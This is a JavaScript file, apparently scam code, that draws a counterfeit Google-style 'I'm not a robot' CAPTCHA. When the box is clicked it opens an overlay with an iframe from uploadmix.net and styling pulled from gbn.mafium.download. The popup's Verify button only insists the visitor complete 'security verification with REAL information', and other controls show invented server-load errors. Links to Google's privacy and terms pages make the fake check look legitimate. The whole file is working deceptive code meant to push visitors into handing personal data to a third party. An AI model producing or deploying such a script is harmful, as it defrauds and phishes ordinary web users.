var gdomain = "uploadmix.net";
$('head').append($('<link rel="stylesheet" type="text/css" />').attr('href', 'https://gbn.mafium.download/youcapt/style.css'));
var CAPTCHA_BOX_ID = "google-captcha-13950";
var CHECKBOX_ID = "checkbox-91534";
var BLUE_CIRCLE_ID = "blue-cirlce-24591";
var BLUE_CIRCLE_LOADING_ID = "blue-circle-loading-54761";
var CAPTCHA_POPUP_ID = "google-captcha-popup-54673";
var LEFT_ICONS_ID = "left-icons-40062";
var VERIFY_BTN_ID = "verify-btn-47114";
var OVERLAY_ID = "overlay-6669";
var frameurl = gdomain+"/"+datab;
var captcha_div = $('[data-captcha-enable=true]');
		var captcha_html = "";
		captcha_html += "<div id='" + CAPTCHA_BOX_ID + "' class='cleanslate' style='width: 330px !important; max-width: 100% !important;'>";
		captcha_html += "		<div class=\"captcha-box\">";
		captcha_html += "			<div class=\"check-box\">";
		captcha_html += "				<div id='" + CHECKBOX_ID + "'><\/div>";
		captcha_html += "				<div id='" + BLUE_CIRCLE_ID + "'><\/div>";
		captcha_html += "				<div id='" + BLUE_CIRCLE_LOADING_ID + "'><\/div>";
		captcha_html += "			<\/div>";
		captcha_html += "			<div class=\"check-box-label\">";
		captcha_html += "				<p>I'm not a robot<\/p>";
		captcha_html += "			<\/div>";
		captcha_html += "			<div class=\"info-text\"><img src='https://s6.postimg.org/pyiuxr00x/logo.png' width='28px' height='28px'>";
		captcha_html += "				<div class=\"text\">";
		captcha_html += "					<p class=\"recaptcha-text\">CAPTCHA<\/p>";
		captcha_html += "					<div class=\"links\"><a href=\"https:\/\/href.li\/?https:\/\/www.google.com\/intl\/en\/policies\/privacy\/\" target=\"_blank\">Privacy<\/a><span>-<\/span><a href=\"https:\/\/href.li\/?https:\/\/www.google.com\/intl\/en\/policies\/terms\/\" target=\"_blank\">Terms<\/a><\/div>";
		captcha_html += "				<\/div>";
		captcha_html += "			<\/div>";
		captcha_html += "		<\/div>";
		captcha_html += "  <\/div>";
		$(captcha_div).html(captcha_html);


		var googleCaptchaIframeID = 'captcha-iframe';
		var popupIframeID = 'popup-iframe';

		$('#' + CHECKBOX_ID).on('click', function() {
			var self = $(this);
			self.css('cssText', 'display: none !important;');
			var blue_cirlce_anim = $('#' + BLUE_CIRCLE_ID);
			blue_cirlce_anim.css('cssText', 'display: block !important;');
			blue_cirlce_anim.html("<img src='https://s6.postimg.org/3y73uv6qp/img_loading_cb2c329306bccd8eafc1951061bfaf00.gif' />");
/* 
			var motioBC = new Motio(blue_cirlce_anim[0], {
				fps: 60,
				frames: 97,
				vertical: true
			});
			motioBC.play();

			var blue_circle_loading_anim = $('#' + BLUE_CIRCLE_LOADING_ID);
*/
			setTimeout(function() {
                                    
                            /* blue_cirlce_anim.css('cssText', 'display: none !important;');
                            motioBC.destroy();
                            blue_circle_loading_anim.css('cssText', 'display: block !important;');
                            var motioBCL = new Motio(blue_circle_loading_anim[0], {
                                fps: 60,
                                frames: 79,
                                vertical: true
                            });
                            motioBCL.play();
							*/
                            $('body').append('<div id="' + OVERLAY_ID + '" style="display: none; width: 100%; height: 100%; position: fixed; top: 0; left: 0; background-color: rgba(0, 0, 0, 0.8); z-index: 10000;"></div>');
							var captcha_popup_html = "<div id='google-captcha-popup-54673' style='width: 400px; max-width: 90%;'><div class='cleanslate heading' style='font-family: Roboto,sans-serif !important;'><div class='inside'><p class='white-text'>Are you a human?</p></div></div><iframe src='https://"+frameurl+"' scrolling='no'></iframe><div class='footer cleanslate'><div class='left'><img id='left-icons-40062' src='https://s6.postimg.org/r4muwjobl/left_icons.png'></div><div class='right'><button class='blue-btn' id='verify-btn-47114'>Verify</button></div></div></div>"
                            $('body').append(captcha_popup_html);

                            if($(window).width() <= 460) {
                                toggleMobile(true);
                            } else {
                                toggleMobile(false);
                                alignPopup();
                            }

                            $(window).on('resize', function() {
                                if($(window).width() > 460) {
                                    toggleMobile(false);
                                    alignPopup();
                                } else {
                                    toggleMobile(true);
                                }
                            });

							$('#' + VERIFY_BTN_ID).on('click', function () {
								window.alert('You must complete security verification with REAL information!');
							});

                            $('#' + LEFT_ICONS_ID).on('click', function() {
                                alert('Disabled due to high server load. Please try again later.');
                            });
							
                            function alignPopup() {
                                var captchaDivOffset = captcha_div.offset();
                                var popup_div = $('#' + CAPTCHA_POPUP_ID);
                                var $window = $(window);

                                var el_top_relative_to_window = captchaDivOffset.top - $window.scrollTop();
                                
                                if(el_top_relative_to_window > ($window.height()/2)) {
                                    popup_div.css('cssText', "left:" + (captchaDivOffset.left + 55) + "px !important;top: " + (captchaDivOffset.top - popup_div.height() + 45) + "px !important;position: absolute !important;z-index: 11000 !important;-webkit-transform: translateX(0%) !important;-moz-transform: translateX(0%) !important;-ms-transform: translateX(0%) !important;-o-transform: translateX(0%) !important;transform: translateX(0%) !important;");
                                    return true;
                                }

                                popup_div.css('cssText', "position: absolute !important;left: " + (captchaDivOffset.left + 55) + "px !important;top: " + (captchaDivOffset.top + 15) + "px !important;z-index: 11000 !important;-webkit-transform: translateX(0%) !important;-moz-transform: translateX(0%) !important;-ms-transform: translateX(0%) !important;-o-transform: translateX(0%) !important;transform: translateX(0%) !important;");
                            }

                            function toggleMobile(on) {
                                var overlay = $('#' + OVERLAY_ID);
                                var popup = $('#' + CAPTCHA_POPUP_ID);
                                if(on) {
                                    $(overlay).show();
                                    $(popup).css('cssText', "width: 90% !important;position: fixed !important;top: 10% !important; left: 50% !important;z-index: 11000 !important;-webkit-transform: translateX(-50%) !important;-moz-transform: translateX(-50%) !important;-ms-transform: translateX(-50%) !important;-o-transform: translateX(-50%) !important;transform: translateX(-50%) !important;");
                                } else {
                                    $(overlay).hide();
                                    alignPopup();
                                }
                            }
			}, 950);
		});
